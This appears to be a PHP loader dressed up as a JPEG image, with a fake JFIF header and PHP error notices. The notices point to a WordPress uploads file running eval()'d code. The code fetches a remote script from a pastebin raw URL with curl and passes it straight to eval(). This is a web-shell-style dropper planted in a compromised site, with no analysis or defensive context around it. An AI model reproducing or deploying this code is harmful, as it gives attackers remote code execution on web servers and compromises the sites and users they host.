ÿØÿà JFIF ÿþ;<br />
<b>Notice</b>:   Undefined index: dl in <b>/var/www/html/web/simple.mini.php</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  Undefined array key "dl" in <b>/home/webdata/feilongswords/wp-content/uploads/333.php(14) : eval()'d code</b> on line <b>5</b><br />
ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://pastebin.com/raw/DxihUesL'));
?>